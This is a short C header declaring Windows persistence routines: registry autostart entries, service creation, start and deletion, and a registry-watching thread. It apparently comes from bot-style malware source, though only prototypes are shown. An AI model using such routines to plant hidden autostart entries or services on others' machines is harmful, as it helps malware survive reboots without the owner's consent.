typedef struct AUTOSTART
{
	HKEY hkey;
	LPCTSTR subkey;

} AUTOSTART;

void AutoStartRegs(char *nfilename=NULL);
bool ServiceAdd(char *sServicename, char *nfilename);
bool ServiceAddInt(char *sServicename, char *sFilename, char *sParams);
bool ServiceStart(char *sServicename);
bool ServiceDel(char *sServicename);
#ifndef NO_REGISTRY
DWORD WINAPI AutoRegistry(LPVOID param);
#endif
